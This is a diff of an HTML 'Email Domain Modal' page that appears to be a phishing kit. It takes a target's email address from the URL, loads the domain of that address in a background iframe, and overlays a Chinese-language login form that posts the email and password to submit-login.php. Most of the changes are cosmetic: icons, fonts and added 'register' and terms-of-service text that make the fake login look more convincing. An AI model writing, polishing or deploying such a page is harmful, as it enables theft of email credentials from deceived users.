@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Domain Modal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body.inactive {
             overflow: hidden;
@@ -16,7 +18,7 @@
             width: 100%;
             height: 100%;
             border: none;
-            z-index: -1; /* Ensure it's behind the modal */
+            z-index: -1;
         }
 
         #overlay {
@@ -26,93 +28,99 @@
             width: 100%;
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
-            z-index: 100; /* Ensure the overlay covers the background */
-            display: none; /* Initially hidden */
+            z-index: 100;
+            display: none;
         }
 
         #modal {
             position: fixed;
             top: 50%;
-            right: 55px; /* Adjusted to create a 35px distance from the right edge */
-            transform: translateY(-50%); /* Center the modal vertically */
+            left: 50%;
+            transform: translate(-50%, -50%);
             background-color: white;
-            width: 400px; /* Modal width */
-            height: 380px; /* Modal height */
+            width: 400px;
+            height: 380px;
             padding: 20px;
-            z-index: 101; /* Modal appears above the overlay */
-            display: none; /* Initially hidden */
-            overflow: auto; /* Allow scrolling if content overflows */
+            z-index: 101;
+            display: none;
+            overflow: hidden;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 15px; 
+            border-radius: 15px;
         }
 
-        /* Additional CSS from the login page */
+        /* Centering the content */
         .super {
+            display: flex;
             align-items: center;
             justify-content: center;
             text-align: center;
+            flex-direction: column;
+            height: 100%;
         }
-    
+
+        /* Basic styling for the page */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: white; /* Light gray background for better contrast */
+            background-color: white;
         }
-    
-        h1 {
+
+        h2 {
             color: blue;
             margin-bottom: 20px;
         }
-    
+
+        /* Form styling */
         #loginForm input[type="text"],
         #loginForm input[type="password"] {
             width: 250px;
-            height: 40px;
-            padding: 8px;
+            height: 35px;
+            padding: 8px 8px 8px 40px;
             margin: 10px 0;
             border: 2px solid black;
             border-radius: 4px;
             box-sizing: border-box;
             transition: border-color 0.3s;
         }
-    
+
         #loginForm input[type="text"]:hover,
         #loginForm input[type="password"]:hover,
         #loginForm input[type="text"]:focus,
         #loginForm input[type="password"]:focus {
             border-color: blue;
         }
-    
+
         #loginForm button {
             background-color: blue;
             color: white;
             border: none;
             padding: 10px 20px;
-            border-radius: 4px;
+            border-radius: 8px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 12px;
+            width: 190px;
             transition: background-color 0.3s;
         }
-    
+
         #loginForm button:hover {
             background-color: darkblue;
         }
-    
+
         .ssl-text {
             color: blue;
             font-style: italic;
         }
-    
+
         .password-container {
             position: relative;
             display: inline-block;
         }
-    
+
         #password {
             padding-right: 0;
         }
-    
+
         #showPassword {
             position: absolute;
             right: 0;
@@ -120,31 +128,74 @@
             transform: translateY(-50%);
             margin-right: 10px;
         }
+
+        /* Input field container for icons */
+        .input-container {
+            position: relative;
+            width: 100%;
+            max-width: 250px;
+            margin-bottom: 5px;
+            border-radius: 8px;
+        }
+
+        .icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #000;
+            font-size: 1.2rem;
+        }
+
+        .sky {
+            margin-top: 10px;
+            font-size: 12px;
+            color: black;
+            text-align: center;
+            cursor: default;
+            transition: color 0.3s ease;
+        }
+
+        .sky:hover {
+            color: blue;
+            cursor: pointer;
+        }
+
+        #loginForm input[type="text"]:hover,
+        #loginForm input[type="password"]:hover,
+        #loginForm button:hover {
+            border-color: blue;
+            box-shadow: 0px 0px 10px rgba(0, 0, 255, 0.5);
+        }
     </style>
 </head>
 <body>
     <div id="overlay"></div>
     <div id="modal">
         <div class="super">
-            <h1 style="text-align: center; color: blue;">
-                <span>账</span> <span>户</span> <span>登</span> <span>录</span>
-            </h1>
+            <img id="email-icon" src="https://www.pngitem.com/pimgs/m/9-99252_email-icon-philippe-the-original-academic-program-icon.png" alt="Email Icon" style="width: 30px; height: 30px;">
+            <h2>账户登录</h2>
             <div class="god">
                 <form id="loginForm" action="submit-login.php" method="post">
-                    <input type="text" id="username" name="username" placeholder="电子邮件" required><br><br>
-                    <div class="password-container">
+                    <div class="input-container">
+                        <i class="fas fa-user icon"></i>
+                        <input type="text" id="username" name="username" placeholder="电子邮件" required>
+                    </div>
+                    <div class="input-container">
+                        <i class="fas fa-lock icon"></i>
                         <input type="password" id="password" name="password" placeholder="密码" required>
                         <input type="checkbox" id="showPassword" onclick="togglePassword()">
                     </div>
-                    <br>
-                    <label>
+                    <label class="sky">
                         <input type="checkbox" name="ssl" id="sslCheckbox">
-                        使用 <span class="ssl-text">SSL</span> 登录
+                        使用 SSL 登录
                     </label>
                     <br><br>
                     <button type="submit">登录</button>
                 </form>
             </div>
+            <p class="sky"> 注册新账号 &nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp; 注册VIP </p><br>
+            <p class="sky">阅读并接受 《服务条款》和 《隐私政策》</p>
         </div>
     </div>
 
@@ -154,7 +205,7 @@
             const params = new URLSearchParams(queryString);
             const email = params.get('files');
             if (email) {
-                return email.split('@')[1]; // Extract domain after the @ symbol
+                return email.split('@')[1];
             }
             return '';
         }
@@ -163,7 +214,7 @@
         function showModal() {
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('modal').style.display = 'block';
-            document.body.classList.add('inactive'); // Disable background scrolling
+            document.body.classList.add('inactive');
         }
 
         // Function to load the iframe in the background
@@ -173,9 +224,9 @@
 
             if (domain) {
                 const iframe = document.createElement('iframe');
-                iframe.src = 'https://' + domain; // Load the domain as the iframe source
+                iframe.src = 'https://' + domain;
                 iframe.className = 'background-iframe';
-                document.body.appendChild(iframe); // Add the iframe to the body
+                document.body.appendChild(iframe);
             }
         }
 
